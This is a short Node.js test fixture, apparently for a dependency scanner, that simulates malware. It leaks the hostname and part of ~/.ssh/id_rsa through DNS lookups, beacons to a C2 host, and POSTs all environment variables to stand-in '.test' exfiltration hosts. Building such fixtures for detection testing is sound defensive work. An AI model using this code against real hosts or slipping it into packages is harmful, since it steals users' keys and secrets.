// Test fixture: simulates malware that phones home
// Does DNS lookups and HTTP requests to exfiltrate data
const dns = require('dns');
const http = require('http');
const https = require('https');
const os = require('os');
const fs = require('fs');

// Suppress unhandled errors so the script doesn't crash mid-exfil
// (real malware does this too)
process.on('uncaughtException', () => {});

// 1. DNS exfiltration — encode stolen data as subdomains
const hostname = os.hostname();
dns.resolve(`${hostname}.exfil.depbot-canary.test`, () => {});
dns.resolve('c2.depbot-canary.test', () => {});

// 2. Read canary files and "exfiltrate" via DNS
try {
  const key = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8');
  const encoded = Buffer.from(key.slice(0, 30)).toString('hex');
  dns.resolve(`${encoded}.ssh-key.depbot-canary.test`, () => {});
} catch (e) {}

// 3. HTTP phone-home attempt
const req1 = http.get('http://c2.depbot-canary.test:8080/beacon', () => {});
req1.on('error', () => {});

// 4. HTTPS exfil attempt
try {
  const data = JSON.stringify(process.env);
  const req2 = https.request({
    hostname: 'exfil.depbot-canary.test',
    port: 443,
    path: '/steal',
    method: 'POST',
    timeout: 2000,
  }, () => {});
  req2.on('error', () => {});
  req2.write(data);
  req2.end();
} catch (e) {}

// Keep process alive briefly so async requests fire
setTimeout(() => process.exit(0), 3000);
